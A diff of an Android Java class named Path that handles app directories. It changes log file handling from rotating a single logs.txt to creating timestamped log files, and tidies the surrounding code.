@@ -17,6 +17,8 @@ import android.os.StatFs;
 import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
+import com.android.service.util.DateTime;
+import com.android.service.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -36,7 +38,7 @@ public class Path {
 	/** The Constant LOG_DIR. */
 	private static String LOG_DIR; //$NON-NLS-1$
 
-	public static final String LOG_FILE = "logs.txt"; //$NON-NLS-1$
+	public static final String LOG_FILE = "logs"; //$NON-NLS-1$
 
 	/** The hidden. */
 	private static String hidden;
@@ -82,21 +84,18 @@ public class Path {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
 				}
-				boolean success=true;
 				
-				success&=createDirectory(conf());
-				success&=createDirectory(markup());
-				success&=createDirectory(logs());
+				boolean success = true;
+				
+				success &= createDirectory(conf());
+				success &= createDirectory(markup());
+				success &= createDirectory(logs());
 
 				if (Cfg.FILE) {
-					final File file = new File(logs(), LOG_FILE);
-					final File bak = new File(logs(), LOG_FILE + ".bak");
-					if(bak.exists()){
-						bak.delete();
-					}
-					if (file.exists()) {						
-						file.renameTo(bak);
-					}
+					DateTime dt = new DateTime();
+					
+					final File file = new File(logs(), LOG_FILE + "-" + dt.getOrderedString() + ".txt");
+					
 					file.createNewFile();
 				}
 
@@ -108,6 +107,7 @@ public class Path {
 				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 			}
 		}
+		
 		return false;
 	}
 
